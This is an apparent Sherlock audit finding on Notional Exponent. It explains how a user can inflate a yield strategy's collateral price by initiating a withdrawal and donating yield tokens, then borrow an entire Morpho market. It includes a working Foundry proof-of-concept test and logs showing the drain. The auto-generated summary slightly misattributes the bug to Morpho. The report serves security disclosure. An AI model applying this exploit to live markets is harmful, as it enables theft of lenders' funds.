---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/lending
  - sector/oracle
  - sector/stable
protocol: "[[Notional]]"
auditors:
  - "[[mstpr-brainbot]]"
report: "https://github.com/sherlock-audit/2025-06-notional-exponent-judging"
genome:
  - "[[spot-price]]"
  - "[[direct-drain]]"
  - "[[oracle-manipulation-resistance]]"
---
# H-2: Attacker can drain the entire suppliers on Morpho market by inflating collateral price

- id: 62483
- impact: HIGH
- protocol: [[Notional]] Exponent
- reporter: mstpr-brainbot (Sherlock)
- source: N/A

## Summary


This bug report outlines a vulnerability found in the Morpho protocol. When a user calls the `initiateWithdraw()` function, their collateral (shares) is not burned but their LP tokens are used to initiate a withdrawal request. However, their shares are still counted in the `effectiveSupply()` which can be manipulated by donating yield tokens to artificially inflate the collateral price on Morpho. This allows the user to borrow a large amount of loan tokens, potentially draining the entire market. The root cause of this issue is due to a miscalculation in the `convertToAssets()` function. A proof of concept has been provided to demonstrate the impact of this vulnerability. To mitigate this issue, further investigation and changes to the code may be needed.

## Details


Source: https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/214 

## Found by 
mstpr-brainbot

### Summary

When `initiateWithdraw()` is called, the user’s collateral in Morpho (i.e., their shares) is **not burned**, but the underlying LP tokens are used to initiate a withdrawal request. At the same time, the **`effectiveSupply()` is decreased** due to the shares being escrowed.

This means the user can **donate yield tokens to the strategy** and artificially **inflate the collateral price on Morpho**, while their original deposit remains safely **secured in the withdrawal process** untouched and retrievable.

### Root Cause

[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L280-L307](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L280-L307)

We can see that when `initiateWithdraw()` is called, the user's assets are registered as a withdrawal request in the `WithdrawRequestManager`, and `s_escrowedShares` is increased.

Since the shares are not burned, `totalSupply()` remains the same before and after the `initiateWithdraw` call. However, because `escrowedShares` increases, the `effectiveSupply()` becomes smaller:
[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L149-L151](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L149-L151)

If the user holds a significant amount of shares, they can initiate a withdrawal, drastically reducing the `effectiveSupply()`. While the minimum `effectiveSupply()` is bounded by `VIRTUAL_SHARES` (set to 1e6), this still opens up a vulnerability.

The next step is to look at how `price()` is calculated in the YieldStrategy (Shares) contract. When users borrow in Morpho, the Morpho oracle (which is the YieldStrategy contract) calls `price()` to determine the value of 1 collateral token in terms of the loan token:
[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L118-L120](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L118-L120)

Since `Morpho.borrow()` can be called directly without going through the LendingRouter, the transient variables are not used. Therefore, the overridden `convertToAssets()` method that depends on transient state is skipped, and the base `super.convertToAssets()` is used instead:
[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/single-sided-lp/AbstractSingleSidedLP.sol#L300-L303](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/single-sided-lp/AbstractSingleSidedLP.sol#L300-L303)

Now, the critical part is how `convertToAssets()` is calculated:

```solidity
function convertToAssets(uint256 shares) public view virtual override returns (uint256) {
    uint256 yieldTokens = convertSharesToYieldToken(shares);
    return (yieldTokens * convertYieldTokenToAsset() * (10 ** _assetDecimals)) /
        (10 ** (_yieldTokenDecimals + DEFAULT_DECIMALS));
}

function convertSharesToYieldToken(uint256 shares) public view override returns (uint256) {
    return (shares * (_yieldTokenBalance() - feesAccrued() + VIRTUAL_YIELD_TOKENS)) / effectiveSupply();
}

function convertYieldTokenToShares(uint256 yieldTokens) public view returns (uint256) {
    return (yieldTokens * effectiveSupply()) / (_yieldTokenBalance() - feesAccrued() + VIRTUAL_YIELD_TOKENS);
}
```

If an attacker donates, say, `1e18` of the yield token to the contract, then the `convertSharesToYieldToken()` for `1e24` shares would compute as:

$$
\frac{1e24 \cdot (1e18 - \text{fees} + 1e6)}{1e6} \approx \text{HUGE value - ~1e36 precision}
$$

Given that `convertYieldTokenToAsset()` always returns `1e18` (i.e., DEFAULT\_PRECISION), the final `convertToAssets()` result becomes:

$$
1e36 \cdot 1e18 \cdot 1e18 / 1e36 = 1e36
$$

This is extremely large.

Since Morpho calculates `maxBorrow = collateral * price() * LTV / 1e36`, and:

* the collateral is on the order of `1e24` (e.g., shares)
* the `price()` returns `1e36`

the result is:

$$
\frac{1e24 \cdot 1e36}{1e36} = 1e24
$$

which means the user can borrow **up to 1e24 units** of the loan token - essentially **draining the entire USDC market** if the loan token uses 6 decimals.

Crucially, the attacker only loses the `1e18` donation of the yield token - which inflated the `price()` - and they can still finalize their withdrawal request and reclaim their original shares.


### Internal Pre-conditions

1. User has significant share of the YieldStrategy such that withdrawing all and donating would increase the rate

### External Pre-conditions

None needed

### Attack Path

1. initiateWithdraw() on YieldStrategy
2. donate some yieldToken to YieldStrategy
3. Borrow the entire YieldStrategy/asset morpho market
4. Finalize the withdrawal request, get back the collaterals

### Impact

All supplied funds to morpho market will be lost. 


### PoC

```solidity
// forge test --match-test test_Drain_MorphoSuppliers_ByInflationDonation -vv
    function test_Drain_MorphoSuppliers_ByInflationDonation() public {
        vm.skip(address(managers[stakeTokenIndex]) == address(0));

        console.log("Asset is", IERC20Metadata(address(asset)).symbol());

        address tapir = address(69);
        deal(address(asset), tapir, defaultDeposit); 
        _enterPosition(tapir, defaultDeposit, 0);
        uint256 balanceBefore = lendingRouter.balanceOfCollateral(tapir, address(y));

        console.log("Effective supply before initiate withdraw: ", y.effectiveSupply());
        console.log("Price before initiate withdraw: ", y.price());

        MarketParams memory marketParams = MorphoLendingRouter(address(lendingRouter)).marketParams(address(y));
        Position memory position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);
        uint maxBorrow = position.collateral * y.price() / 1e36;
        console.log("Max borrow is: ", maxBorrow);

        vm.startPrank(tapir);
        lendingRouter.initiateWithdraw(tapir, address(y), getWithdrawRequestData(tapir, balanceBefore));

        position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);
        maxBorrow = position.collateral * y.price() / 1e36;
        console.log("Max borrow after initiate withdraw: ", maxBorrow);

        console.log("Effective supply after initiate withdraw: ", y.effectiveSupply());
        console.log("Price after initiate withdraw: ", y.price());

        deal(address(y.yieldToken()), tapir, 1e18);
        console.log("Yield token of the vault: ", IERC20Metadata(address(y.yieldToken())).symbol());
        IERC20(y.yieldToken()).transfer(address(y), 1e18);

        position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);
        maxBorrow = position.collateral * y.price() / 1e36;
        console.log("Max borrow after donation: ", maxBorrow);

        console.log("Effective supply after donation: ", y.effectiveSupply());
        console.log("Price after donation: ", y.price());

        Id idx = Id.wrap(keccak256(abi.encode(marketParams)));
        Market memory market = MORPHO.market(idx);
        console.log("Total supplied", market.totalSupplyAssets);
        console.log("Total borrowed", market.totalBorrowAssets);

        uint256 borrowable = market.totalSupplyAssets - market.totalBorrowAssets;
        console.log("Borrowable is", borrowable);

        MORPHO.borrow(marketParams, borrowable, 0, tapir, tapir);
        console.log("Effective supply after borrow: ", y.effectiveSupply());

        position = MORPHO.position(idx, tapir);
        console.log("collateral", position.collateral);
        console.log("borrowShares", position.borrowShares);

        maxBorrow = position.collateral * y.price() / 1e36;
        uint canBorrow = maxBorrow - position.borrowShares;
        console.log("Can borrow is", canBorrow); // STILL EXTREMELY HIGH! 
    }
```

Logs:
Ran 1 test for tests/TestSingleSidedLPStrategyImpl.sol:Test_LP_Curve_sDAI_sUSDe
[PASS] test_Drain_MorphoSuppliers_ByInflationDonation() (gas: 2739684)
Logs:
  Asset is USDC
  Effective supply before initiate withdraw:  8724580706403393214704000000
  Price before initiate withdraw:  1145196000000000000
  Max borrow is:  9991354926
  Max borrow after initiate withdraw:  9991354926
  Effective supply after initiate withdraw:  1000000
  Price after initiate withdraw:  1145196000000000000
  Yield token of the vault:  MtEthena-gauge
  Max borrow after donation:  9991362815231220073495623667
  Effective supply after donation:  1000000
  Price after donation:  1145196904178796121145196000000000000 // HUGE
  Total supplied 500000000000
  Total borrowed 0
  Borrowable is 500000000000
  Effective supply after borrow:  1000000
  collateral 8724580706403393214703000000
  borrowShares 500000000000000000
  Can borrow is 9991362814731220073495623667

### Mitigation

tbd
